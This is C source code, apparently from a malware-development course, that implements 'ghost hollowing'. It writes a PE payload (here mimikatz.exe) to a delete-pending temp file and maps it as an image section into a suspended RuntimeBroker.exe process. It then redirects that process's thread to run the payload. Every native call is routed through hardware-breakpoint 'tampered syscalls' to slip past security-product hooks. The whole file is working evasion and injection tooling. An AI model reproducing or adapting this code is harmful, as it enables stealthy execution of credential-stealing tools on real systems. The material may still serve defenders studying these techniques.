// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

#include "Structs.h"

// ==========================================================================================================================

#define ZwOpenFile_CRC					0x1AB98307
#define ZwSetInformationFile_CRC			0x7CD58168
#define ZwWriteFile_CRC					0xE84D69F9
#define ZwCreateSection_CRC				0x4A23A81B
#define ZwMapViewOfSection_CRC				0xC5D6775B
#define ZwGetContextThread_CRC				0xB2930066
#define ZwSetContextThread_CRC				0x8085727F
#define ZwWriteVirtualMemory_CRC			0xFAB864E6
#define ZwResumeThread_CRC				0x14A0CC11

// ==========================================================================================================================

// From TamperedSyscalls.c - Line:59
extern fnNtQueryDirectoryFile g_pNtQuerySecurityObject;

// ==========================================================================================================================

#define TAMPER_SYSCALL(u32SyscallHash, uParm1, uParm2, uParm3, uParm4, uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB)					\
	if (1){																			\
																				\
		NTSTATUS			STATUS				= 0x00;										\
																				\
		if (!StoreTamperedSyscallParms(u32SyscallHash, uParm1, uParm2, uParm3, uParm4))									\
			return -1;																\
																				\
		if ((STATUS = g_pNtQuerySecurityObject(NULL, NULL, NULL, NULL, uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB)) != 0x00) {		\
			printf("[!] 0x%0.8X Failed With Error: 0x%0.8X \n", u32SyscallHash, STATUS);								\
			return -1;																\
		}																		\
	}

// ==========================================================================================================================

BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE * ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile				= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize			= NULL,
			dwNumberOfBytesRead	 	= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!szFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer	= pBaseAddress;
	*pdwFileSize	= dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

// ==========================================================================================================================

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// ==========================================================================================================================

BOOL CreateGhostHollowingProcessW(IN LPWSTR szLegitWindowsPeWithArgs, IN ULONG_PTR uPePayloadBuffer, IN SIZE_T sPePayloadSize, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL				bResult					= FALSE;
	PVOID				pMappedImgAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs				= NULL;
	SIZE_T				sViewSize				= 0x00;
	CONTEXT				ThreadContext				= { .ContextFlags = CONTEXT_ALL };
	STARTUPINFOW			StartupInfo				= { 0 };
	UNICODE_STRING			usFileName				= { 0 };
	OBJECT_ATTRIBUTES		ObjectAttr				= { 0 };
	IO_STATUS_BLOCK			StatusBlock				= { 0 };
	FILE_DISPOSITION_INFORMATION	FileDispInfo				= { .DeleteFileW = TRUE };
	LARGE_INTEGER			ByteOffset				= { 0 };
	WCHAR				szTmpPath[MAX_PATH]			= { 0 };
	WCHAR				szTmpFilePath[MAX_PATH]			= { 0 };
	WCHAR				szTmpFileNtPath[MAX_PATH * 2]		= { 0 };
	HANDLE				hTmpFileHandle				= NULL,
					hGhostSection				= NULL;
	PWCHAR				pwcDuplicateStr				= NULL,
					pwcLastSlash				= NULL;

	if (!szLegitWindowsPeWithArgs || !uPePayloadBuffer || !sPePayloadSize || !lpProcessInformation)
		return FALSE;

	if (!(pwcDuplicateStr = _wcsdup(szLegitWindowsPeWithArgs)))
		return FALSE;

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (GetTempFileNameW(szTmpPath, L"PG", 0x00, szTmpFilePath) == 0x00) {
		printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	wsprintfW(szTmpFileNtPath, L"\\??\\%s", szTmpFilePath);

	printf("[i] Created Tmp Path: %ws \n", szTmpFileNtPath);

	RtlInitUnicodeString(&usFileName, szTmpFileNtPath);
	InitializeObjectAttributes(&ObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	/*
	if (!NT_SUCCESS((STATUS = NtOpenFile(&hTmpFileHandle, (DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &ObjectAttr, &StatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
	}
	*/

	TAMPER_SYSCALL(ZwOpenFile_CRC, 
		&hTmpFileHandle,
		(DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE),
		&ObjectAttr, 
		&StatusBlock, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	printf("[+] Fetched Tmp File Handle: 0x%0.8X \n", hTmpFileHandle);

	/*
	if (!NT_SUCCESS((STATUS = pNtSetInformationFile(hTmpFileHandle, &StatusBlock, &FileDispInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation)))) {
	}
	*/

	TAMPER_SYSCALL(ZwSetInformationFile_CRC,
		hTmpFileHandle,
		&StatusBlock,
		&FileDispInfo,
		sizeof(FILE_DISPOSITION_INFORMATION),
		FileDispositionInformation,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);


	/*
	if (!NT_SUCCESS((STATUS = NtWriteFile(hTmpFileHandle, NULL, NULL, NULL, &StatusBlock, uPePayloadBuffer, sPePayloadSize, &ByteOffset, NULL)))) {
	}
	*/

	TAMPER_SYSCALL(ZwWriteFile_CRC,
		hTmpFileHandle,
		NULL,
		NULL,
		NULL,
		&StatusBlock,
		uPePayloadBuffer,
		sPePayloadSize,
		&ByteOffset,
		NULL,
		NULL,
		NULL
	);


	printf("[i] Wrote Pe Payload To Tmp File \n");

	/*
	if (!NT_SUCCESS((STATUS = NtCreateSection(&hGhostSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hTmpFileHandle))) || !hGhostSection) {
	}
	*/

	TAMPER_SYSCALL(ZwCreateSection_CRC,
		&hGhostSection,
		SECTION_ALL_ACCESS,
		NULL,
		0x00,
		PAGE_READONLY,
		SEC_IMAGE,
		hTmpFileHandle,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (!hGhostSection)
		return FALSE;

	printf("[+] Created Ghost Section: 0x%0.8X \n", hGhostSection);

	DELETE_HANDLE(hTmpFileHandle);

	printf("[i] Deleted Tmp File From The Disk\n");

	if (!CreateProcessW(NULL, szLegitWindowsPeWithArgs, NULL, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, pwcDuplicateStr, &StartupInfo, lpProcessInformation)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] Created Remote Process With PID: %d \n", lpProcessInformation->dwProcessId);

	/*
	if (!NT_SUCCESS((STATUS = NtMapViewOfSection(hGhostSection, lpProcessInformation->hProcess, &pMappedImgAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY)))) {
	}
	*/

	TAMPER_SYSCALL(ZwMapViewOfSection_CRC,
		hGhostSection,
		lpProcessInformation->hProcess,
		&pMappedImgAddress,
		NULL,
		NULL,
		NULL,
		&sViewSize,
		ViewUnmap,
		NULL,
		PAGE_READONLY,
		NULL
	);

	printf("[i] Base Address Of The Mapped Ghost Section: 0x%p \n", pMappedImgAddress);

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	printf("[i] Hijacking Thread Of ID: %d \n", lpProcessInformation->dwThreadId);

	/*
	if (!NT_SUCCESS((STATUS = NtGetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
	}
	*/

	TAMPER_SYSCALL(ZwGetContextThread_CRC,
		lpProcessInformation->hThread,
		&ThreadContext,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);


	ThreadContext.Rcx = (DWORD64)((ULONG_PTR)pMappedImgAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	/*
	if (!NT_SUCCESS((STATUS = NtSetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
	}
	*/

	TAMPER_SYSCALL(ZwSetContextThread_CRC,
		lpProcessInformation->hThread,
		&ThreadContext,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	printf("[+] PE Payload Entry Point: 0x%p \n", ThreadContext.Rcx);

	/*
	if (!NT_SUCCESS((STATUS = NtWriteVirtualMemory(lpProcessInformation->hProcess, (LPVOID)(ThreadContext.Rdx + offsetof(PEB, ImageBase)), &pMappedImgAddress, sizeof(ULONGLONG), NULL)))) {
	}
	*/

	TAMPER_SYSCALL(ZwWriteVirtualMemory_CRC,
		lpProcessInformation->hProcess,
		(LPVOID)(ThreadContext.Rdx + offsetof(PEB, ImageBase)),
		&pMappedImgAddress,
		sizeof(ULONGLONG),
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);


	printf("[*] Updated Image Base Address In The Remote Process PEB \n");

	/*
	if (!NT_SUCCESS((STATUS = NtResumeThread(lpProcessInformation->hThread, NULL)))) {
	}
	*/

	TAMPER_SYSCALL(ZwResumeThread_CRC,
		lpProcessInformation->hThread,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	printf("[*] Resumed Remote Process \n");

	bResult = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	DELETE_HANDLE(hTmpFileHandle);
	DELETE_HANDLE(hGhostSection);
	return bResult;
}

// ==========================================================================================================================

#define PAYLOAD_IMG	L"C:\\Users\\NULL0x00\\Documents\\Payloads\\mimikatz.exe"
#define PROCESS_IMG	L"C:\\Windows\\system32\\RuntimeBroker.exe coffee"


int main() {

	if (!InitHardwareBreakpointHooking())
		return -1;

	PBYTE				pImgPayloadBuff			= NULL;
	SIZE_T				sImgPayloadSize			= NULL;
	PROCESS_INFORMATION		ProcessInformation		= { 0 };
	WCHAR				szProcessImg[MAX_PATH]		= PROCESS_IMG;

	if (!ReadFileFromDiskW(PAYLOAD_IMG, &pImgPayloadBuff, &sImgPayloadSize))
		return -1;

	if (!CreateGhostHollowingProcessW(szProcessImg, pImgPayloadBuff, sImgPayloadSize, &ProcessInformation))
		return -1;

	if (!HaltHardwareBreakpointHooking())
		return -1;
	
}
